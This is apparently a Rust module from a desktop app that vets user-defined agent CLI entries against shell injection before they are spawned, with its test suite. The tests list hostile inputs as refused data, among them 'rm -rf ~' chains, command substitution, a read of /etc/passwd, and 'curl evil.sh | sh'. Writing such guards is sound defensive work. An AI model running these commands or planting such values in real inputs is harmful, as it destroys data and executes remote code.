//! Custom agent CLIs — user-declared pane kinds (`aider`, `codex`, …) that
//! widen the spawn allowlist by explicit user consent, WITHOUT weakening
//! its invariant: `agent_spawn.rs` builds every command line from its own
//! vetted copies, and a compromised renderer can never supply a binary or
//! arguments. This module is the vetting half of that; ports
//! `src/main/lib/custom-agents.js`, pinned by `test/custom-agents.test.js`
//! (ported below as `#[cfg(test)] mod tests`).
//!
//! The shape of the threat: the custom list lives in the same JSON store
//! the renderer writes through `store:set`, and `store:set` is one of the
//! channels open pre-login — so neither the write path nor the stored
//! bytes are trustworthy. The defense is that this module is the ONLY
//! thing that ever turns stored entries into spawnable kinds, and it
//! re-vets every entry on every read: an entry that fails any rule below
//! is dropped, not repaired, so a poisoned store degrades to "fewer kinds
//! in the + menu" rather than to a command line. What survives vetting is
//! inert by construction: `bin` is a bare command name resolved by the
//! login shell's `PATH` exactly the way the built-ins are (never an
//! absolute path, never a caller-supplied one), and every `args` token is
//! a literal with no shell metacharacters, because the result is joined
//! into the same `zsh -l -c` line the built-ins run on — the character
//! guard here is load-bearing for the same reason `is_safe_model` is in
//! `agent_spawn.rs`.
//!
//! `raw` entries are typed `&serde_json::Value` rather than a concrete
//! Rust struct — deliberately: the whole point of this module is that the
//! store's bytes are untrusted JSON of unknown shape (a hand edit, an
//! older build, a compromised pre-login write), so a caller cannot
//! type-check its way past this door the way it could for e.g.
//! `agent_spawn::build_agent_spawn_from`'s `model: Option<&str>` — there
//! the underlying value genuinely cannot be anything but a string once it
//! survives Tauri's own IPC deserialization, but here the "string" the
//! store hands back is exactly the point being defended against.

// Every item below is exercised by its own #[cfg(test)] suite, but in a
// plain (non-test) build nothing calls any of it yet — same rationale as
// `agent_spawn.rs`'s module-level allow (see that module's top doc
// comment): the real caller (`ipc::pty::pty_create`, resolving `kind`
// against `merge_agents(AGENTS, readStore("custom-agents"))`) is a
// different slice's file and still a stub as of this slice landing.
#![allow(dead_code)]

use std::collections::HashSet;

use crate::agent_spawn::{AgentEntry, AGENTS};

/// Kinds already spoken for: the built-in agent CLIs, plus every
/// non-agent pane kind the renderer's `conductor:open` switch and menus
/// treat as reserved words. A custom id colliding with any of these would
/// shadow a built-in in the merged list (or confuse a switch that never
/// expects an agent there), so it is refused outright.
const RESERVED_NON_AGENT_IDS: &[&str] = &[
    "terminal", "chat", "brain", "flow", "runs", "doc", "editor", "events",
];

fn is_reserved_id(id: &str) -> bool {
    AGENTS.contains(&id) || RESERVED_NON_AGENT_IDS.contains(&id)
}

const MAX_ARGS: usize = 8;
const MAX_ARG_LEN: usize = 64;

/// Port of `ID_RE = /^[a-z0-9][a-z0-9-]{0,31}$/`: 1–32 chars, first
/// character a lowercase letter or digit, the rest lowercase letters,
/// digits, or dashes.
fn is_id_shape_valid(id: &str) -> bool {
    let mut chars = id.chars();
    let Some(first) = chars.next() else {
        return false;
    };
    if !(first.is_ascii_lowercase() || first.is_ascii_digit()) {
        return false;
    }
    let rest: Vec<char> = chars.collect();
    rest.len() <= 31
        && rest
            .iter()
            .all(|&c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-')
}

/// Port of `BIN_RE = /^[a-z0-9._-]{0,63}$/i` — a bare command name, no
/// path separators: 1–64 chars, first character alphanumeric (either
/// case), the rest alphanumeric/dot/underscore/dash (either case). The
/// first-character rule is stricter than the rest — a leading `-` would
/// read as a flag, a leading `.`/`_` is needlessly permissive — matching
/// the JS regex's own asymmetry between `[a-z0-9]` (first char) and
/// `[a-z0-9._-]` (the rest).
fn is_bin_shape_valid(bin: &str) -> bool {
    let mut chars = bin.chars();
    let Some(first) = chars.next() else {
        return false;
    };
    if !first.is_ascii_alphanumeric() {
        return false;
    }
    let rest: Vec<char> = chars.collect();
    rest.len() <= 63
        && rest
            .iter()
            .all(|&c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'))
}

/// Port of `MODELFLAG_RE = /^--[a-z-]{2,20}$/`: a literal `--` prefix,
/// then 2–20 lowercase letters or dashes. Deliberately permissive of an
/// all-dash tail (`---model` passes: the third dash matches `[a-z-]`) —
/// the guard's job is keeping the token inert on the command line, not
/// policing taste.
fn is_model_flag_shape_valid(flag: &str) -> bool {
    let Some(rest) = flag.strip_prefix("--") else {
        return false;
    };
    let len = rest.chars().count();
    (2..=20).contains(&len) && rest.chars().all(|c| c.is_ascii_lowercase() || c == '-')
}

/// Port of the label rule `/^[\x20-\x7e]+$/` combined with the length
/// cap: 1–40 chars, every one printable ASCII (space included — unlike
/// args, a label may contain spaces; "Aider", not "aider").
fn is_valid_label(label: &str) -> bool {
    !label.is_empty()
        && label.chars().count() <= 40
        && label.chars().all(|c| ('\u{20}'..='\u{7e}').contains(&c))
}

/// Port of `ARG_BAD_RE = /[^\x20-\x7e]|[;&|`$<>"'\\\s]/`, inverted to an
/// "is this token safe" predicate plus the length/emptiness bounds `args`
/// rules apply alongside it. An arg is joined into the `zsh -l -c` line
/// verbatim, so it must be an inert literal: printable ASCII only (no
/// control chars), none of the shell metacharacters (they would chain
/// commands, redirect, substitute, or quote their way out of being one
/// token), and no whitespace — single tokens only, which keeps the join
/// auditable: the command line is always `bin arg arg …` and never
/// something a shell re-parses into more than that.
fn is_inert_arg(arg: &str) -> bool {
    if arg.is_empty() || arg.chars().count() > MAX_ARG_LEN {
        return false;
    }
    arg.chars().all(|c| {
        ('\u{20}'..='\u{7e}').contains(&c)
            && !matches!(
                c,
                ';' | '&' | '|' | '`' | '$' | '<' | '>' | '"' | '\'' | '\\' | ' '
            )
    })
}

/// `vet_custom_agent(raw)` → the vetted `AgentEntry` (always `custom:
/// true`, `label: Some(..)`), or `Err(reason)`. `agent` is a freshly built
/// value holding only the vetted fields — `raw` is read and thrown away,
/// never carried forward, the same "compare, then pass the allowlist's
/// own copy" posture `agent_spawn.rs` takes toward model aliases.
pub fn vet_custom_agent(raw: &serde_json::Value) -> Result<AgentEntry, String> {
    if !raw.is_object() {
        return Err("not an object".to_string());
    }
    let id = raw.get("id").and_then(|v| v.as_str()).unwrap_or_default();
    if !is_id_shape_valid(id) {
        return Err(
            "id must be 1–32 chars of [a-z0-9-], starting with a letter or digit".to_string(),
        );
    }
    if is_reserved_id(id) {
        return Err(format!(r#"id "{id}" is a built-in pane kind"#));
    }
    let label = raw
        .get("label")
        .and_then(|v| v.as_str())
        .unwrap_or_default();
    if !is_valid_label(label) {
        return Err("label must be 1–40 chars of printable ASCII".to_string());
    }
    let bin = raw.get("bin").and_then(|v| v.as_str()).unwrap_or_default();
    if !is_bin_shape_valid(bin) {
        return Err("bin must be a bare command name (no path separators)".to_string());
    }

    let mut args = Vec::new();
    if let Some(v) = raw.get("args") {
        let arr = v
            .as_array()
            .ok_or_else(|| format!("args must be an array of at most {MAX_ARGS} tokens"))?;
        if arr.len() > MAX_ARGS {
            return Err(format!(
                "args must be an array of at most {MAX_ARGS} tokens"
            ));
        }
        for a in arr {
            let s = a.as_str().filter(|s| is_inert_arg(s));
            let Some(s) = s else {
                return Err(format!(
                    "args must be single inert tokens (\u{2264}{MAX_ARG_LEN} chars, no spaces or shell metacharacters)"
                ));
            };
            args.push(s.to_string());
        }
    }

    let mut model_flag = None;
    if let Some(v) = raw.get("modelFlag") {
        let s = v.as_str().filter(|s| is_model_flag_shape_valid(s));
        let Some(s) = s else {
            return Err("modelFlag must look like --model (/--[a-z-]{2,20}/)".to_string());
        };
        model_flag = Some(s.to_string());
    }

    Ok(AgentEntry {
        id: id.to_string(),
        bin: bin.to_string(),
        custom: true,
        label: Some(label.to_string()),
        args,
        model_flag,
    })
}

/// `merge_agents(builtins, customs)` → the combined spawnable list as
/// `AgentEntry`s — built-ins first (normalized via `AgentEntry::builtin`),
/// then vetted customs — so every consumer (the spawn builder, a future
/// agents-list command, the conductor's kind descriptions) reads one
/// shape instead of branching on built-in-vs-custom. Customs are re-vetted
/// HERE, on the way in, so callers can hand over raw store bytes without
/// trusting them — a bad entry is dropped silently (the store is
/// user-editable JSON; "fewer agents than the file lists" is the correct
/// failure mode, not a thrown spawn path). Duplicate custom ids keep the
/// first entry, so a later duplicate can never shadow an earlier one — and
/// no custom can shadow a built-in, because `vet_custom_agent` already
/// refused those ids.
///
/// `customs` is `&serde_json::Value` rather than `&[Value]` so a caller
/// can hand over exactly what `store::get("custom-agents")` returns
/// without pre-checking its shape — `Value::Array` is required, anything
/// else (missing key, a hand-edited scalar/object) is treated as empty,
/// porting `Array.isArray(customs) ? customs : []`.
pub fn merge_agents(builtins: &[&str], customs: &serde_json::Value) -> Vec<AgentEntry> {
    let mut out: Vec<AgentEntry> = builtins
        .iter()
        .map(|&name| AgentEntry::builtin(name))
        .collect();
    let mut seen: HashSet<String> = builtins.iter().map(|s| s.to_string()).collect();
    if let Some(arr) = customs.as_array() {
        for raw in arr {
            if let Ok(agent) = vet_custom_agent(raw) {
                if seen.contains(&agent.id) {
                    continue;
                }
                seen.insert(agent.id.clone());
                out.push(agent);
            }
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::agent_spawn::{build_agent_spawn, build_agent_spawn_from, AGENT_MODELS};

    fn aider() -> serde_json::Value {
        serde_json::json!({ "id": "aider", "label": "Aider", "bin": "aider" })
    }

    fn with(base: &serde_json::Value, key: &str, value: serde_json::Value) -> serde_json::Value {
        let mut merged = base.clone();
        merged[key] = value;
        merged
    }

    // ---- vet_custom_agent — accepts ----

    #[test]
    fn accepts_a_minimal_entry() {
        let agent = vet_custom_agent(&aider()).unwrap();
        assert_eq!(agent.id, "aider");
        assert_eq!(agent.label, Some("Aider".to_string()));
        assert_eq!(agent.bin, "aider");
        assert!(agent.args.is_empty());
        assert_eq!(agent.model_flag, None);
        assert!(agent.custom);
    }

    #[test]
    fn accepts_an_entry_with_args_and_a_model_flag_and_returns_a_fresh_value() {
        let raw = serde_json::json!({
            "id": "codex", "label": "Codex CLI", "bin": "codex",
            "args": ["--full-auto", "-q"], "modelFlag": "--model",
        });
        let agent = vet_custom_agent(&raw).unwrap();
        assert_eq!(
            agent.args,
            vec!["--full-auto".to_string(), "-q".to_string()]
        );
        assert_eq!(agent.model_flag, Some("--model".to_string()));
        // The vetted copy shares nothing with the caller's value: `raw`
        // is immutable input here (owned `String`s inside `agent`), so
        // there is no live aliasing to prove — the fresh-object guarantee
        // is structural rather than something a mutation test can catch
        // in Rust, unlike JS's shared-array-reference footgun.
    }

    #[test]
    fn drops_an_empty_args_array_rather_than_carrying_it() {
        let agent = vet_custom_agent(&with(&aider(), "args", serde_json::json!([]))).unwrap();
        assert!(agent.args.is_empty());
    }

    #[test]
    fn accepts_bins_with_dots_underscores_dashes_and_upper_case() {
        for bin in ["claude-code", "my_cli", "GPT-4.sh", "aider.chat"] {
            assert!(
                vet_custom_agent(&with(&aider(), "bin", serde_json::json!(bin))).is_ok(),
                "{bin} should be accepted"
            );
        }
    }

    // ---- vet_custom_agent — id rules ----

    #[test]
    fn refuses_every_reserved_id() {
        for id in [
            "claude", "opencode", "pi", // built-in agents
            "terminal", "chat", "brain", "flow", "runs", "doc", "editor",
            "events", // reserved non-agent kinds
        ] {
            let err = vet_custom_agent(&with(&aider(), "id", serde_json::json!(id))).unwrap_err();
            assert!(err.contains("built-in"), "{id}: {err}");
        }
    }

    #[test]
    fn refuses_malformed_ids() {
        for id in [
            "Aider",
            "aider_cli",
            "-aider",
            "aider ",
            "",
            &"a".repeat(33),
            "aidér",
        ] {
            assert!(
                vet_custom_agent(&with(&aider(), "id", serde_json::json!(id))).is_err(),
                "{id} should be refused"
            );
        }
    }

    #[test]
    fn accepts_a_32_char_id_and_refuses_33() {
        assert!(vet_custom_agent(&with(&aider(), "id", serde_json::json!("a".repeat(32)))).is_ok());
        assert!(
            vet_custom_agent(&with(&aider(), "id", serde_json::json!("a".repeat(33)))).is_err()
        );
    }

    // ---- vet_custom_agent — label rules ----

    #[test]
    fn refuses_bad_labels() {
        for label in ["", &"x".repeat(41), "a\tb", "a\nb", "café"] {
            assert!(
                vet_custom_agent(&with(&aider(), "label", serde_json::json!(label))).is_err(),
                "{label:?} should be refused"
            );
        }
    }

    #[test]
    fn accepts_40_chars_of_printable_ascii_label() {
        assert!(
            vet_custom_agent(&with(&aider(), "label", serde_json::json!("x".repeat(40)))).is_ok()
        );
    }

    // ---- vet_custom_agent — bin rules ----

    #[test]
    fn refuses_bad_bins() {
        for bin in [
            "/usr/local/bin/aider", // absolute path — resolution is PATH's job
            "../bin/aider",         // traversal
            "bin/aider",            // any separator at all
            "aider\\cli",
            "aider;rm", // separators are the only chars the regex must keep out…
            "aider rm", // …but a space would become two tokens on the command line
            "aider$HOME",
            "",
            "-aider", // must not start with a flag dash
            &"x".repeat(65),
        ] {
            assert!(
                vet_custom_agent(&with(&aider(), "bin", serde_json::json!(bin))).is_err(),
                "{bin} should be refused"
            );
        }
    }

    // ---- vet_custom_agent — args rules ----

    #[test]
    fn refuses_hostile_arg_tokens() {
        // These tokens ride into the same `zsh -l -c` line the built-ins
        // run on, so every one of these refusals is a shell injection
        // that dies at the door rather than at the spawn.
        for arg in [
            "--yes;rm -rf ~", // chaining
            "--foo|sh",       // pipe
            "--foo&rm",       // backgrounding
            "$(id)",          // substitution
            "`id`",
            "--out>/tmp/x", // redirect
            "--in</etc/passwd",
            "--model='x'", // quoting out of being one token
            "--say \"hi\"",
            "--esc\\ape", // backslash — escape attempts stay literal
            "two words",  // embedded space — single tokens only
            "tab\ttoken", // control chars
            "new\nline",
            "", // empty is not a token
            &"x".repeat(65),
        ] {
            let err =
                vet_custom_agent(&with(&aider(), "args", serde_json::json!([arg]))).unwrap_err();
            assert!(err.contains("args"), "{arg:?}: {err}");
        }
    }

    #[test]
    fn refuses_more_than_8_args() {
        assert!(
            vet_custom_agent(&with(&aider(), "args", serde_json::json!(vec!["-q"; 9]))).is_err()
        );
        assert!(
            vet_custom_agent(&with(&aider(), "args", serde_json::json!(vec!["-q"; 8]))).is_ok()
        );
    }

    #[test]
    fn refuses_a_non_array_args() {
        assert!(
            vet_custom_agent(&with(&aider(), "args", serde_json::json!("--full-auto"))).is_err()
        );
    }

    // ---- vet_custom_agent — modelFlag rules ----

    #[test]
    fn accepts_wellformed_model_flags() {
        for flag in ["--model", "--mdl", "--use-model"] {
            assert!(
                vet_custom_agent(&with(&aider(), "modelFlag", serde_json::json!(flag))).is_ok()
            );
        }
    }

    #[test]
    fn refuses_malformed_model_flags() {
        for flag in [
            "-m",
            "--Model",
            "--model=x",
            "--model ",
            "--m",
            &format!("--{}", "m".repeat(21)),
        ] {
            assert!(
                vet_custom_agent(&with(&aider(), "modelFlag", serde_json::json!(flag))).is_err(),
                "{flag} should be refused"
            );
        }
    }

    #[test]
    fn model_flag_extra_dash_prefix_still_passes_the_letter_rule() {
        // '---model' passes the letter rule (the third dash matches
        // [a-z-]): the guard's job is keeping the token inert on the
        // command line, not policing taste, and an all-dashes token is.
        // Documented in the JS suite's comments but not asserted there;
        // asserted here since Rust has no equivalent inline comment-only
        // convention for "this is deliberately permissive".
        assert!(
            vet_custom_agent(&with(&aider(), "modelFlag", serde_json::json!("---model"))).is_ok()
        );
    }

    // ---- vet_custom_agent — shape rules ----

    #[test]
    fn refuses_a_non_object_entry() {
        for raw in [
            serde_json::Value::Null,
            serde_json::json!("aider"),
            serde_json::json!(42),
            serde_json::json!([]),
        ] {
            assert!(vet_custom_agent(&raw).is_err(), "{raw:?} should be refused");
        }
    }

    #[test]
    fn strips_fields_it_did_not_vet() {
        // A store entry carrying extra keys (an older build, a hand
        // edit) must not smuggle them into the merged entry — `AgentEntry`
        // has no field to carry `cmd`/`env` in at all.
        let raw = serde_json::json!({
            "id": "aider", "label": "Aider", "bin": "aider",
            "cmd": "rm -rf ~", "env": { "PATH": "" },
        });
        let agent = vet_custom_agent(&raw).unwrap();
        assert_eq!(agent.id, "aider");
        assert_eq!(agent.label, Some("Aider".to_string()));
        assert_eq!(agent.bin, "aider");
        assert!(agent.args.is_empty());
        assert_eq!(agent.model_flag, None);
    }

    // ---- merge_agents ----

    #[test]
    fn normalizes_builtins_and_appends_vetted_customs() {
        let customs = serde_json::json!([aider()]);
        let merged = merge_agents(AGENTS, &customs);
        let expected_builtins: Vec<AgentEntry> =
            AGENTS.iter().map(|&n| AgentEntry::builtin(n)).collect();
        assert_eq!(&merged[..AGENTS.len()], &expected_builtins[..]);
        assert_eq!(merged[AGENTS.len()], vet_custom_agent(&aider()).unwrap());
    }

    #[test]
    fn drops_entries_that_fail_vetting_instead_of_erroring() {
        // The store is user-editable JSON; "fewer agents than the file
        // lists" is the correct failure mode, not a broken spawn path.
        let customs = serde_json::json!([
            aider(),
            { "id": "evil", "label": "Evil", "bin": "/bin/sh" },
            null,
            "nope",
        ]);
        let merged = merge_agents(AGENTS, &customs);
        let customs_only: Vec<&AgentEntry> = merged.iter().filter(|a| a.custom).collect();
        assert_eq!(customs_only.len(), 1);
        assert_eq!(customs_only[0].id, "aider");
    }

    #[test]
    fn keeps_the_first_of_duplicate_custom_ids() {
        let customs = serde_json::json!([
            { "id": "aider", "label": "Aider", "bin": "aider" },
            { "id": "aider", "label": "Impostor", "bin": "impostor" },
        ]);
        let merged = merge_agents(AGENTS, &customs);
        let customs_only: Vec<&AgentEntry> = merged.iter().filter(|a| a.custom).collect();
        assert_eq!(customs_only.len(), 1);
        assert_eq!(customs_only[0].bin, "aider");
    }

    #[test]
    fn treats_a_non_array_customs_value_as_empty() {
        for customs in [
            serde_json::Value::Null,
            serde_json::json!("aider"),
            serde_json::json!(42),
            serde_json::json!({}),
        ] {
            let merged = merge_agents(AGENTS, &customs);
            let expected: Vec<AgentEntry> =
                AGENTS.iter().map(|&n| AgentEntry::builtin(n)).collect();
            assert_eq!(merged, expected);
        }
    }

    #[test]
    fn cannot_grow_a_custom_that_shadows_a_builtin_even_raw() {
        // vet_custom_agent refuses reserved ids, so a hand-edited store
        // entry claiming to BE claude is dropped — it never reaches the
        // merged list where it would shadow the real one.
        let customs = serde_json::json!([{ "id": "claude", "label": "Not Claude", "bin": "evil" }]);
        let merged = merge_agents(AGENTS, &customs);
        let claude_entries: Vec<&AgentEntry> = merged.iter().filter(|a| a.id == "claude").collect();
        assert_eq!(claude_entries.len(), 1);
        assert_eq!(claude_entries[0], &AgentEntry::builtin("claude"));
    }

    // ---- build_agent_spawn_from — customs ----

    fn codex_list() -> Vec<AgentEntry> {
        let customs = serde_json::json!([
            aider(),
            { "id": "codex", "label": "Codex CLI", "bin": "codex", "args": ["--full-auto"], "modelFlag": "--model" },
        ]);
        merge_agents(AGENTS, &customs)
    }

    #[test]
    fn builds_the_bare_bin_for_a_custom_without_args() {
        assert_eq!(
            build_agent_spawn_from(&codex_list(), "aider", None),
            Some("aider".to_string())
        );
    }

    #[test]
    fn joins_bin_and_vetted_args_into_the_command_line() {
        assert_eq!(
            build_agent_spawn_from(&codex_list(), "codex", None),
            Some("codex --full-auto".to_string())
        );
    }

    #[test]
    fn returns_none_for_an_unknown_kind() {
        assert_eq!(build_agent_spawn_from(&codex_list(), "gpt", None), None);
        assert_eq!(
            build_agent_spawn_from(&codex_list(), "terminal", None),
            None
        );
    }

    #[test]
    fn returns_none_for_an_empty_list() {
        assert_eq!(build_agent_spawn_from(&[], "aider", None), None);
    }

    #[test]
    fn honors_a_model_pin_only_when_the_custom_declared_a_flag_and_the_alias_is_allowlisted() {
        // Customs start with empty model lists (agent-models.js has no
        // 'codex' entry) — same posture as opencode/pi — so even a
        // declared flag gets no pin until the shared allowlist learns
        // aliases for the kind.
        assert_eq!(
            build_agent_spawn_from(&codex_list(), "codex", Some("gpt-5")),
            Some("codex --full-auto".to_string())
        );
    }

    #[test]
    fn drops_a_pin_for_a_custom_with_no_modelflag_without_guessing_one() {
        assert_eq!(
            build_agent_spawn_from(&codex_list(), "aider", Some("haiku")),
            Some("aider".to_string())
        );
    }

    #[test]
    fn uses_the_custom_flag_spelling_when_an_alias_is_allowlisted_for_the_kind() {
        // The JS suite simulates AGENT_MODELS "learning" about a
        // hypothetical 'codex' kind by mutating the shared (mutable, JS)
        // allowlist object at runtime; `agent_spawn::AGENT_MODELS` here is
        // a `const`, so there is nothing to mutate. This proves the same
        // property instead — a custom's OWN modelFlag spelling wins over
        // the built-in `--model` constant once the alias matches — using
        // a synthetic entry against 'claude', which already carries real
        // allowlisted aliases.
        let synthetic = AgentEntry {
            id: "claude".to_string(),
            bin: "my-claude-fork".to_string(),
            custom: true,
            label: Some("Fork".to_string()),
            args: Vec::new(),
            model_flag: Some("--use-model".to_string()),
        };
        assert!(AGENT_MODELS
            .iter()
            .any(|&(k, models)| k == "claude" && models.contains(&"haiku")));
        assert_eq!(
            build_agent_spawn_from(&[synthetic], "claude", Some("haiku")),
            Some("my-claude-fork --use-model haiku".to_string())
        );
    }

    // ---- build_agent_spawn — the built-in wrapper is untouched by customs ----

    #[test]
    fn the_builtin_wrapper_still_builds_builtins_exactly_as_before() {
        assert_eq!(
            build_agent_spawn("claude", Some("haiku")),
            Some("claude --model haiku".to_string())
        );
        assert_eq!(
            build_agent_spawn("opencode", None),
            Some("opencode".to_string())
        );
    }

    #[test]
    fn the_builtin_wrapper_does_not_know_about_custom_kinds() {
        // The wrapper exists so pre-customs callers keep their semantics:
        // a caller that never merged the store must not spawn
        // store-defined kinds.
        assert_eq!(build_agent_spawn("aider", None), None);
    }

    #[test]
    fn the_safe_model_invariant_holds_for_builtins_reached_through_the_merged_list() {
        let customs = serde_json::json!([aider()]);
        let list = merge_agents(AGENTS, &customs);
        let poisoned = "haiku; curl evil.sh | sh";
        assert_eq!(
            build_agent_spawn_from(&list, "claude", Some(poisoned)),
            Some("claude".to_string())
        );
    }
}
